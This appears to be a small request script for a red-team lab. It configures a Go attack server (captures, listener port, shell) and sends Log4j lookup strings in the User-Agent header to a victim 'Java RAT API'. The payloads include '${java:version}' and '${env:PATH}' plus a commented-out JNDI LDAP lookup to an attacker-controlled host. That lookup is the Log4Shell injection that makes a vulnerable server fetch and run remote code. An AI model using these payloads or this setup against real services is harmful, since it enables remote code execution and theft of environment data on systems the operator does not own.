###env
red_url     = 'http://192.168.1.6'
victim_url  = 'http://192.168.1.6'
go_url      = red_url + ':2080'
apache2_url = red_url + ':2022'
###env

#// RED                                     |
### Go API                                  |
### -----------							    |
get(go_url + '/');                          # GET root endpoints
get(go_url + '/captures');                  # GET captures
get(go_url + '/properties');                # GET properties
patch(go_url + '/properties', json = {      # PATCH properties
    "HOST": "192.168.1.6",
    "PORT_JAVA_HTTP": "",
    "PORT_LISTENER": "2200",
    "SHELL": ""	
});

### Apache2 HTTP							|
### ------------							|
get(apache2_url + '/');                     # GET root

#// VCITIM 									|
### Java RAT API							|
### -----------								|
get(victim_url + ':56092/');   				# GET root payload
get(victim_url + ':56092/', headers = {		# GET root payload (custom header)
#	'User-Agent': '${java:runtime}'
	'User-Agent': '${java:version}'
#	'User-Agent': '${env:PATH}'
#	'User-Agent': '${jndi:ldap://192.168.1.6:2038/cn=1807422020,dc=attacker,dc=com}'
}); 
